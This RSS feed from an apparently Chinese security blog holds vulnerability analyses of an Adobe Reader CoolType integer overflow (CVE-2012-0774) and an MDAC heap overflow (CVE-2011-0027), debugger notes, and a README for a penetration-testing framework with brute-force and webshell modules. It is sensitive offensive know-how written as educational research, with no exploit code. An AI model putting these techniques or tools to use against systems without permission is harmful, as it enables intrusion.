<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sun, 25 Dec 2016 21:16:44 +0800</pubDate>
    <lastBuildDate>Sun, 25 Dec 2016 21:16:44 +0800</lastBuildDate>
    <generator>Jekyll v3.3.1</generator>
    
      <item>
        <title>漏洞战争-cve-2012-0774</title>
        <description>&lt;h3 id=&quot;0x00-prepare&quot;&gt;0x00 Prepare&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.adobe reader 9.4.0
2.immunity debugger
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;打开adobe reader,od附加
f9
adobe reader中打开poc.pdf
    adobe reader崩溃,但是od无法捕获异常,换成immunity debugger可捕获异常位置

重新打开reader,immunity debugger附加
f9
reader打开poc.pdf,异常捕获,中断如下:
    6DD979C9   8D71 04          LEA ESI,DWORD PTR DS:[ECX+4]
    6DD979CC   8B1E             MOV EBX,DWORD PTR DS:[ESI]
    6DD979CE   8919             MOV DWORD PTR DS:[ECX],EBX
    6DD979D0   8BCE             MOV ECX,ESI
    6DD979D2  ^75 F4            JNZ SHORT CoolType.6DD979C8
    6DD979D4   83E8 04          SUB EAX,4
    中断位置为6dd979ce处的MOV DWORD PTR DS:[ECX],EBX,immunity debugger中下面状态栏中显示:access violation when
    wring to 6dfcf000,也即[ecx]所在内存空间不可写,因此导致崩溃，从当前堆栈窗口中找出最上面的return to的地址,右
    键在反汇编窗口跟随,得到当前的6dd979ce处的指令在如下call 调用的函数帧空间中:

    6DD96956   50               PUSH EAX
    6DD96957   FF148D D0BEFA6D  CALL DWORD PTR DS:[ECX*4+6DFABED0]       ; vulfunc
    6DD9695E   59               POP ECX
    将6dd96957处的调用标记为vulfunc,现在要在6dd96957处下断点并查看这个调用过程,但是有aslr机制,重新下断时这里不
    再会是6dd96957,需算出6dd96957与当前dll的偏移再根据偏移在重新运行reader后下断点,alt+e:
    
    Executable modules, item 22
    Base=6DD90000
    Size=0025F000 (2486272.)
    Entry=6DDD866B CoolType.&amp;lt;ModuleEntryPoint&amp;gt;
    Name=CoolType
    File version=5.05.73.1
    Path=C:\Program Files (x86)\Adobe\Reader 9.0\Reader\CoolType.dll
    在alt+e窗口中得到vulfunc在CoolType.dll中,且vulfunc在CoolType.dll中的内存偏移为:6dd96957-6dd90000=6957

重新打开reader并用immu附加,f9,alt+e,发现cooltype.dll的基址不变,仍然是6dd90000,那么前面一步的计算偏移就是多余的
了,看来泉哥在这里的想法不完全正确,这里不用算偏移,应该是操作系统没有为cooltype.dll开aslr.可直接在6dd96957处下断.
后来发现是自己错了,重新运行reader并用immu附加后cooltype.dll的地址会是6dd90000或是69360000,eg.第一次运行reader并
用immu附加后cooltype.dll的基址为6dd90000,关闭reader和immu后,第二次运行reader并用immu附加后cooltype.dll的基址为
69360000,第三次又变回6dd90000,第四次则为69360000,...以此交替.说明cooltype.dll还是开了aslr的.继续用偏移的方法下
断点,重新打开reader,immu附加,第一次cooltype.dll的基址为6dd90000,第二次为69360000,此时在69360000+6957=69366957处
下断

ctrl+g:69366957
f2
    69366955   51               PUSH ECX
    69366956   50               PUSH EAX
    69366957   FF148D D0BE5769  CALL DWORD PTR DS:[ECX*4+6957BED0]
    6936695E   59               POP ECX
    6936695F   59               POP ECX

在69366957处shift+f4下条件记录断点,记录ecx(ecx是虚拟指令索引号),设置为不中断,explanation设成:&quot;index ecx&quot;,
expression设成:&quot;ecx&quot;

f9
reader打开poc.pdf
    再次崩溃,由immu捕获崩溃,与上次崩溃信息相同,得到log面板中日志如下:

    ...
    ...
    ...
    ...
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000063
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 000000B0
    69366957   COND: index ecx = 00000061
    69366957   COND: index ecx = 00000042
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 00000078
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000063
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 000000B0
    69366957   COND: index ecx = 00000061
    69366957   COND: index ecx = 00000042
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 00000078
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000026
    693679CE   [18:15:48] Access violation when writing to [6959F000]
    说明是索引号为26的call调用造成了access violation,设置条件断点:当ecx为26时中断

重新打开reader并用immu附加,这次cooltype.dll基址为6dd90000,6dd90000+6957=6dd96957,ctrl+g:6dd96957
    6DD96955   51               PUSH ECX
    6DD96956   50               PUSH EAX
    6DD96957   FF148D D0BEFA6D  CALL DWORD PTR DS:[ECX*4+6DFABED0]       ; vulfunc
    6DD9695E   59               POP ECX
    6DD9695F   59               POP ECX
    6DD96960   3BC6             CMP EAX,ESI

在6dd96957上设置条件断点,shift+f2,设置断点条件为ecx==26
f9
reader打开poc.pdf
    成功中断到6dd96957处,且ecx=26,f7跟进call,汇编指令如下:

    6DD9798B   A1 E023FC6D      MOV EAX,DWORD PTR DS:[6DFC23E0]
    6DD97990   8B0D EC23FC6D    MOV ECX,DWORD PTR DS:[6DFC23EC]
    6DD97996   53               PUSH EBX
    6DD97997   56               PUSH ESI
    6DD97998   8B31             MOV ESI,DWORD PTR DS:[ECX]
    6DD9799A   8D50 FC          LEA EDX,DWORD PTR DS:[EAX-4]
    6DD9799D   3BD6             CMP EDX,ESI
    6DD9799F   57               PUSH EDI
    6DD979A0   72 45            JB SHORT CoolType.6DD979E7
    6DD979A2   8BB9 54010000    MOV EDI,DWORD PTR DS:[ECX+154]
    6DD979A8   3BD7             CMP EDX,EDI
    6DD979AA   73 3B            JNB SHORT CoolType.6DD979E7
    6DD979AC   83C0 FC          ADD EAX,-4
    6DD979AF   8B10             MOV EDX,DWORD PTR DS:[EAX]
    6DD979B1   8BDA             MOV EBX,EDX
    6DD979B3   C1E3 02          SHL EBX,2
    6DD979B6   8BC8             MOV ECX,EAX
    6DD979B8   2BCB             SUB ECX,EBX
    6DD979BA   3BCE             CMP ECX,ESI
    6DD979BC   72 29            JB SHORT CoolType.6DD979E7
    6DD979BE   3BCF             CMP ECX,EDI
    6DD979C0   73 25            JNB SHORT CoolType.6DD979E7
    6DD979C2   85D2             TEST EDX,EDX
    6DD979C4   8B39             MOV EDI,DWORD PTR DS:[ECX]
    6DD979C6   7E 0F            JLE SHORT CoolType.6DD979D7
    6DD979C8   4A               DEC EDX
    6DD979C9   8D71 04          LEA ESI,DWORD PTR DS:[ECX+4]
    6DD979CC   8B1E             MOV EBX,DWORD PTR DS:[ESI]
    6DD979CE   8919             MOV DWORD PTR DS:[ECX],EBX
    6DD979D0   8BCE             MOV ECX,ESI
    6DD979D2  ^75 F4            JNZ SHORT CoolType.6DD979C8
    6DD979D4   83E8 04          SUB EAX,4
    6DD979D7   8938             MOV DWORD PTR DS:[EAX],EDI
    6DD979D9   83C0 04          ADD EAX,4
    6DD979DC   A3 E023FC6D      MOV DWORD PTR DS:[6DFC23E0],EAX
    6DD979E1   8B4424 10        MOV EAX,DWORD PTR SS:[ESP+10]
    6DD979E5   EB 0F            JMP SHORT CoolType.6DD979F6
    6DD979E7   A1 3824FC6D      MOV EAX,DWORD PTR DS:[6DFC2438]
    6DD979EC   C705 3424FC6D 10&amp;gt;MOV DWORD PTR DS:[6DFC2434],1110
    6DD979F6   5F               POP EDI
    6DD979F7   5E               POP ESI
    6DD979F8   5B               POP EBX
    6DD979F9   C3               RETN
    此时eip=6dd9768b,单步跟踪

f8
f8
...
eip=6dd979b3
    此时汇编指令为shl ebx,2,寄存器值如下:

    EAX 6DFC622C CoolType.6DFC622C
    ECX 0577E4E4
    EDX 40000001
    EBX 40000001
    ESP 0014CA20
    EBP 0014CAB4
    ESI 6DFC6220 ASCII &quot;AA&quot;
    EDI 6DFC6344 ASCII &quot;tnfs&quot;
    EIP 6DD979B3 CoolType.6DD979B3
    这里的ebx为0x40000001,shl ebx,2之后得到ebx=0x40000001*4=0x100000004=0x00000004,导致整数溢出,再继续单步跟踪
    到6DD979CE处的MOV DWORD PTR DS:[ECX],EBX应该会出现前面一样的access violation,reader崩溃.

f8
...
eip=6dd979ce
    此时并没有崩溃,因为在6dd979c8到6dd979d2为一个循环,会在这个循环中的某一次中出现access violation使得reader崩
    溃,0x40000001是溢出的关键,它完全是由虚拟指令操作实现的.为了看清0x40000001是怎么出现的,需要知道每个虚拟指令
    索引号对应的call中的汇编指令效果,于是对溢出前的每个虚拟指令索引号对应的CALL DWORD PTR DS:[ECX*4+6DFABED0]
    设置条件记录断点,记录call前与call后虚拟栈顶vm_esp的值及虚拟指令.这里的虚拟栈顶vm_esp并不是指esp中的数据,这
    里的虚拟指令类似于java的虚拟机指令,是&quot;虚拟的&quot;,并不是真实栈中的数据,而是对虚拟指令而言的&quot;虚拟栈&quot;,如B0 01虚拟
    指令对应将1压栈的动作,这里的压栈是对虚拟指令而言的栈,并不是真实的esp中的栈,要想得到&quot;虚拟栈&quot;中的数据,需要得到
    &quot;虚拟栈&quot;对应的真实内存地址,跟踪B0 01虚拟指令的CALL DWORD PTR DS:[ECX*4+6DFABED0]的处理情况,进行如下操作

重新打开read并用immu附加,这次cooltype.dll的基址为69360000,ctrl+g:69366957,在69366957处下条件断点,设置条件为
ecx=0xB0

f9
reader打开poc.pdf
    成功中断在ecx=b0情况下,对应call的函数帧中指令如下:
            
    69368B05   A1 E0235969      MOV EAX,DWORD PTR DS:[695923E0]
    69368B0A   8B15 EC235969    MOV EDX,DWORD PTR DS:[695923EC]
    69368B10   8D48 04          LEA ECX,DWORD PTR DS:[EAX+4]
    69368B13   3B8A 54010000    CMP ECX,DWORD PTR DS:[EDX+154]
    69368B19   77 18            JA SHORT CoolType.69368B33
    69368B1B   3B0A             CMP ECX,DWORD PTR DS:[EDX]
    69368B1D   76 14            JBE SHORT CoolType.69368B33
    69368B1F   8B4C24 04        MOV ECX,DWORD PTR SS:[ESP+4]
    69368B23   0FB611           MOVZX EDX,BYTE PTR DS:[ECX]
    69368B26   8910             MOV DWORD PTR DS:[EAX],EDX
    69368B28   8305 E0235969 04 ADD DWORD PTR DS:[695923E0],4
    69368B2F   8D41 01          LEA EAX,DWORD PTR DS:[ECX+1]
    69368B32   C3               RETN
    由于B0 01虚拟指令对应的虚拟动作是将1压栈,现在要找到1所在的真实内存位置,f8单步

f8
...
...
f8
eip=69368b26时,edx=1,[eax]=1,对应&quot;虚拟栈顶&quot;vm_esp中的数据
f8
eip=69368b28时,此时已经将1赋值给[eax],此时可以看到[695923e0]=69596240=eax
f8
    eip=69368b2f,此时已经执行完ADD DWORD PTR DS:[695923E0],4,后面再f8再次就执行完call了,执行完call之后要想得到
    &quot;虚拟栈顶&quot;vm_esp中的数据的方法为:查看真实内存中的值[[695923e0]-4],所以要想得到溢出前每个索引对应的call在
    call执行前与call执行后虚拟栈顶的值及虚拟指令,则需要设置条件记录断点,并设置expression为:&quot;[[695923e0]-4]&quot;,为
    了观察更多,也记录vm_esp-4中的数据,并在call调用前和调用后分别记录,也即最后这样设置:
    在call的上一句指令处设置条件记录断点,并设置explanation为:&quot;执行前[vm_esp]&quot;,设置expression为:&quot;[[695923e0]-4]&quot;
    在call的上一句指令处设置条件记录断点,并设置explanation为:&quot;执行前[vm_esp-4],设置expression为&quot;[[695923e0]-8]&quot;
    在call指令处设置条件记录断点,并设置explanation为:&quot;虚拟指令索引号&quot;,设置expression为&quot;ecx&quot;
    在call的下一句指令处设置条件记录断点,并设置explanation为:&quot;执行后[vm_esp]&quot;,设置expression为:&quot;[[695923e0]-4]&quot;
    在call的下一句指令处设置条件记录断点,并设置explanation为:&quot;执行后[vm_esp-4],设置expression为&quot;[[695923e0]-8]&quot;
    上面5个设置中都设置不中断且记录expression的值

重新打开read并用immu附加,此时cooltype.dll基址为6dd90000,关键call调用的地址为6dd96957   
ctrl+g:6dd96957,按照上面的5个设置条件记录断点之后便可得到书中对应log记录,再通过分析log得到0x40000001的来源过程.
需注意要在32位系统上调试,如果在64位系统上调试应该设置explanation为vm_esp和vm_esp-8,expression对应为
[[695923e0]-4]和[[695923e0]-0xc].

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/25/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0774/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/25/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0774/</guid>
        
        <category>漏洞分析</category>
        
        <category>整数溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>od命令</title>
        <description>&lt;h3 id=&quot;0x01-od知识&quot;&gt;0x01 OD知识&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;od调试常见断点及原理
    http://blog.csdn.net/qq_20977145/article/details/52687730
2&amp;gt;条件断点,条件记录断点
    http://blog.csdn.net/hgy413/article/details/7711925
    条件断点:shift+f2
    条件记录断点:shift+f4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-od技巧&quot;&gt;0x02 OD技巧&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/crack/2016/12/25/od%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/crack/2016/12/25/od%E5%91%BD%E4%BB%A4/</guid>
        
        <category>od</category>
        
        
        <category>crack</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2011-0027</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;p&gt;漏洞情况:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MDAC是一套用于在windows上提供数据库连接的组件,由于MDAC没有正确验证内部数据结构的内存分配,当RecordSet中用于
指定缓冲区大小的CacheSize属性过大时会导致整数溢出,造成实际分配的内存空间小于原来指定的内存空间.
荷兰黑客Peter Vreugdenhil在Pwn2Own 2010中利用cve-2011-0027 Microsoft Data Access Components(MDAC)的堆溢出漏
洞攻破了Windows7上的IE8,利用信息泄露和rop绕过aslr和dep的保护,赢得高额奖金. 微软于2011年1月补丁日修复这个漏
洞,对应微软信息安全公告MS11-002
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;准备:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在msf中search ms11-002或search cve-2011-0027都没有结果,这个漏洞要结合一个uaf漏洞来达到控制代码执行的目的,
msf中没有相关exp,google[site:exploit-db.com cve-2011-0027]或者在书中配套资料中可找到exp文件,该exp是个html
文件,对应exploit-db链接为:https://www.exploit-db.com/exploits/15984/

运行exploit-db中的exp,在win7x32+ie8和winXp(x32)+ie6下运行都失败,不能成功利用(代码中是弹出calc.exe),作者博客
中:
    http://vreugdenhilresearch.nl/ms11-002-pwn2own-heap-overflow/
提到:
    &quot;这当然需要你按照正确的顺序布局堆:[cachebuffer] [string] [objects]我设法做到这一点,它是工作和稳定的,
    当我在pwn2own机器上运行它,但它可能是只适用于特定的一个确切的IE8和Windows 7补丁版本

    另外:我只使用堆溢出的信息披露,但有足够的选项,将它变成RCE,至少对于WinXP,也可能为Windows 7.但对于实
    际的RCE我使用一个后免费的bug 几个月前补丁:
    http://www.microsoft.com/technet/security/bulletin/MS10-035.mspx

    我有几个版本的exp在我的硬盘,我不知道哪个是实际工作的最终版本,所以我只是把一个在这里.
    另外:我使用的DEP逃避是基于在pwn2opwn时与W7一起提供的msado.dll版本,基本上做了一个VirtualProtect调用我
    的Aligned堆喷雾,并把它可执行.

    记住,这是原始代码,它是在我很忙的时候写的,所以它是丑陋的,低效的,可能充满了奇怪的变量名. 此外,它需
    要Alex Sotirovs heapLib.js来运行.&quot;

很遗憾作者没有把通用的exp写出来或放出来,这里只学习其中的相关技术点
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-技术点&quot;&gt;0x01 技术点&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] 作者用的漏洞利用方法是通过在js中修改\00\00字符串终止符来越界访问对象的虚表指针的值来计算出模块基址然后构造
rop绕过dep,这里的技术点与下面链接中的第三个技术点相同,可参考下面链接
http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/

[+] 书中泉哥的分析漏洞的方法为经典的+hpa添加页堆的方法来分析,流程为:
a)+hpa
b)在windbg中得到中断位置为6887746f,具体如下:
6887746f 8906       mov     dword ptr [esi],eax ds:0023:088c8000=????????
c)此时要敏感地看看出错的内存位置是不是堆块中
!heap -p -a 88c8000分析发现出错的内存位置果然在堆块中,在该命令的结果中有关于这个堆块的栈信息,这应该是在这个堆块
在分配时的栈空间中esp附近的信息(被windbg保存了),通过查看!heap -p -a addr命令得到的与该堆块相关的栈中信息可以看
到函数调用过程,书中对应栈中数据大致为:
730d975d MSDART!MpHeapAlloc+0x00000029
6e5406e7 msado15!CRecordGroup::AllocateHRowRange+0x00000085
6e540650 msado15!CRecordset::PrepareForFetch+0x000000e2
...
这样的栈中数据可以判断出这个堆块在分配时依次调用过PrepareForFetch-&amp;gt;AllocateHRowRange-&amp;gt;MpHeapAlloc,因为在栈中的
数据为这三个函数的某个偏移(分别为+0x000000e2,+0x00000085,+0x00000029),说明在730d975d,6e5406e7,6e540650处的各个
对应的函数帧中的上一句汇编指令为call xxx格式的指令,这样才将call xxx指令的下一句指令的内存地址压栈,也即说明在堆
块分配时经历过这些函数

[+] UAF漏洞为&quot;释放后引用&quot;漏洞,发生在堆中,在free一块内存后,接着申请大小相同的一块内存,操作系统会将刚刚free掉的
内存再次分配给新申请的的动作,释放(free)的动作是为了再分配时可以预测新分配动作将得到的分配地址的情况,这样可以利
用js代码或其他方法将这个预测到的内存地址附近的内容修改为构造的内容,如果后面可以再引用(访问)释放的内存,这样就会
引用到被修改的内容,达到控制代码执行的目的.

[+] 汇编常见比较跳转指令小结如下:[AB无符号,GL有符号]
有符号指令    无符号指令    描述
JG            JA            大于则跳转
JNG           JNA           不大于则跳转
JGE           JAE           大于等于则跳转
JNGE          JNAE          不大于等于则跳转
JL            JB            小于则跳转
JNL           JNB           不小于则跳转
JLE           JBE           小于等于则跳转
JNLE          JNBE          不小于等于则跳转

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 24 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/24/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0027/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/24/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0027/</guid>
        
        <category>整数溢出</category>
        
        <category>漏洞战争</category>
        
        <category>漏洞分析</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>3xp10it自动化渗透测试框架1.0</title>
        <description>&lt;h3 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] legal disclaimer: Usage of 3xp10it.py and web.py for attacking targets without prior mutual consent is 
illegal.It is the end user's responsibility to obey all applicable local, state and federal laws.Developers
assume no liability and are not responsible for any misuse or damage caused by this program.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;install&quot;&gt;Install&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/3xp10it/3xp10it.git
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 3xp10it.py
[python3 web.py],可选,如果运行则要新开一个终端运行以便于查看相关输出信息
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;requirement&quot;&gt;Requirement&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;need python3
need pip3
mysql
works on linux(test on ubuntu and kali2.0,others not test)

python3安装可参考如下步骤:
	apt-get install python3
	或:
	wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tar.xz
	tar xJf Python-3.5.2.tar.xz
	cd Python-3.5.2
	./configure --prefix=/opt/python3
	make &amp;amp;&amp;amp; make install
	ln -s /opt/python3/bin/python3.5 /usr/local/bin/python3
	
pip3安装:
apt-get install -y python3-pip

kali linux2安装pip3可参考如下步骤:
	echo &quot;deb-src http://http.kali.org/kali kali main non-free contrib&quot; &amp;gt;&amp;gt; /etc/apt/sources.list
	echo &quot;deb-src http://security.kali.org/kali-security kali/updates main contrib non-free&quot; &amp;gt;&amp;gt;
/etc/apt/sources.list
	apt-get update
	apt-get install python3-pip
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;a)3xp10it是一个自动化渗透测试框架,目前没有做到完全自动化[自动上传漏洞利用框架和自动fuzz框架暂时没有加入]&lt;/p&gt;

&lt;p&gt;b)支持功能列表&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;高危漏洞扫描模块&lt;/li&gt;
  &lt;li&gt;爬虫模块&lt;/li&gt;
  &lt;li&gt;目标网站脚本类型检测&lt;/li&gt;
  &lt;li&gt;目录扫描模块&lt;/li&gt;
  &lt;li&gt;sqli扫描模块&lt;/li&gt;
  &lt;li&gt;robots/sitemap自动收集&lt;/li&gt;
  &lt;li&gt;cms识别与cms漏洞扫描模块&lt;/li&gt;
  &lt;li&gt;自动识别管理员页面并爆破[支持自动识别简单验证码]&lt;/li&gt;
  &lt;li&gt;webshell自动查找与爆破,支持asp,php,aspx,jsp&lt;/li&gt;
  &lt;li&gt;whois信息收集&lt;/li&gt;
  &lt;li&gt;资源文件收集&lt;/li&gt;
  &lt;li&gt;旁站获取&lt;/li&gt;
  &lt;li&gt;子站获取&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;c)可选工作模式&lt;/p&gt;

&lt;p&gt;模式一:扫描目标和目标的所有旁站&lt;br /&gt;
模式二:扫描目标和目标的所有子站&lt;br /&gt;
模式三:扫描目标和目标的所有旁站和所有子站&lt;br /&gt;
模式四:只扫描目标&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;默认使用模式一扫描[在运行3xp10it后可自选],上面四种模式中的[扫描目标]里的目标支持批量导入多个目标和手工录入多个
目标.四种工作模式中与旁站和子站相关的由程序自动完成[eg.选择模式三工作时,将自动获取导入的目标的所有旁站和所有子
站,并对这些旁站和子站依次遍历上面的各个扫描模块]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;d)特点&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;可在中断后重新运行时从断点附近接着上次的过程扫描,不用重新扫描&lt;/li&gt;
  &lt;li&gt;运行3xp10it后自动从数据库中取出待完成的扫描任务进行扫描&lt;/li&gt;
  &lt;li&gt;支持正常扫描和优先扫描两个扫描组,如果优先扫描组里有任务则先扫描优先扫描组里的目标,在添加任务时可选择将目标是
正常扫描还是优先扫描&lt;/li&gt;
  &lt;li&gt;上述支持功能列表中的功能默认全部遍历扫描,如果要使用单个模块可在web界面使用&lt;/li&gt;
  &lt;li&gt;3xp10it配备一个web后台,web页面可查询当前扫描结果与使用单个模块功能&lt;/li&gt;
  &lt;li&gt;3xp10it独立于web运行,也即没有目录下的pannel文件夹也可运行&lt;/li&gt;
  &lt;li&gt;目录下的pannel文件夹是Django为3xp10it写的一些相关界面,web界面使用在下面介绍&lt;/li&gt;
  &lt;li&gt;支持找到高危漏洞邮件通知[eg.sqli,webshell爆破成功等]&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;e)web后台说明&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;web后台如下图,需要管理员身份登录才可进后台
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/login.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/web.png&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;web后台相当于3xp10it的部分界面+分割的模块化工具+exp10it中没有的功能的附加工具的集合&lt;/li&gt;
  &lt;li&gt;web后台由Django==1.10.3开发&lt;/li&gt;
  &lt;li&gt;web后台中支持工具列表
    &lt;ul&gt;
      &lt;li&gt;targets:查看扫描目标,新增/删除扫描目标&lt;/li&gt;
      &lt;li&gt;
        &lt;table&gt;
          &lt;tbody&gt;
            &lt;tr&gt;
              &lt;td&gt;获取旁&lt;/td&gt;
              &lt;td&gt;子站:获取旁站或子站模块&lt;/td&gt;
            &lt;/tr&gt;
          &lt;/tbody&gt;
        &lt;/table&gt;
      &lt;/li&gt;
      &lt;li&gt;xcdn:尝试识别cdn背后的真实ip[3xp10it中没有这个功能]&lt;/li&gt;
      &lt;li&gt;高危漏扫:高危漏洞扫描模块&lt;/li&gt;
      &lt;li&gt;sqli:sql注入模块&lt;/li&gt;
      &lt;li&gt;扫目录:目录扫描模块&lt;/li&gt;
      &lt;li&gt;cms漏扫:cms漏洞扫描模块&lt;/li&gt;
      &lt;li&gt;webshell爆破:webshell爆破模块&lt;/li&gt;
      &lt;li&gt;管理员登录爆破:管理员登录爆破模块&lt;/li&gt;
      &lt;li&gt;waf爆破:waf自动爆破模块[3xp10it中没有这个功能]&lt;/li&gt;
      &lt;li&gt;dbquery:数据库语句执行接口&lt;/li&gt;
      &lt;li&gt;扫描结果:查看当前扫描结果&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.3xp10it需要用到bingapi,需要先申请好bingapi
2.上面的web.py不一定要运行,核心功能在3xp10it.py文件中
3.如果要后台功能需运行python3 web.py
4.如果要使用web.py,重新开机后需要重新运行web.py
5.运行web.py常见错误:端口被占用.解决方法:
a)netstat -ntlp | grep 8000
b)在a)中找到pid后kill -9 pid
c)重新运行python3 web.py
6.3xp10it中调用的是关键模块exp10it中的exp10itScanner,exp10it模块由pip3 install exp10it安装,安装路径一般如下:
/usr/local/lib/python3.5/dist-packages
7.文件分布结构如下:

当前目录
.
├── 3xp10it.py
├── pannel
│   ├── ghostdriver.log
│   ├── manage.py
│   ├── models.py[web后台没有用django的模型]
│   ├── pages[web页面的html文件,相当于django的template]
│   └── pannel[django相关文件]
│       ├── __init__.py
│       ├── settings.py
│       ├── urls.py[django配置的访问与响应规则]
│       ├── views.py[django配置的关键函数]
│       └── wsgi.py
├── readme.md
├── uninstall.py
└── web.py


/usr/local/lib/python3.5/dist-packages路径下相关文件

├── cms_identify[cms识别模块相关文件]
├── cms_scan[cms漏洞扫描模块相关文件]
├── config.ini[配置文件]
├── dicts[字典文件]
├── dirsearch[目录扫描模块相关文件]
├── exp10it.py[关键模块文件]
├── exps[exp模块相关文件]
├── log[日志文件夹]
├── tools[web后台中的各个工具]

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;todo&quot;&gt;Todo&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.webshell爆破速度提升1000倍(接地气思路,unfinished)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;changelog&quot;&gt;Changelog&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;
